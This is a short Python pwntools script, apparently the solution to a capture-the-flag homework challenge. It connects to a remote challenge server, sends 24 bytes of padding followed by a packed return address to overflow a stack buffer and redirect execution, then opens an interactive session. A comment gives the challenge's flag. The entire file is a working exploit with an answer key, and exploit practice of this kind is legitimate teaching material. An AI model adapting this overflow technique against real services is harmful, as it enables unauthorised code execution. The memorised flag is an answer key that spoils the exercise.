#!/usr/bin/python3

# flag{c0ffee_0verfl0win6_from_k3ttle_QAQ}

from pwn import *

r = remote('hw00.zoolab.org', 65534)
target = p64(0x401195)

r.sendline(b'a'*24 + target)

r.interactive()
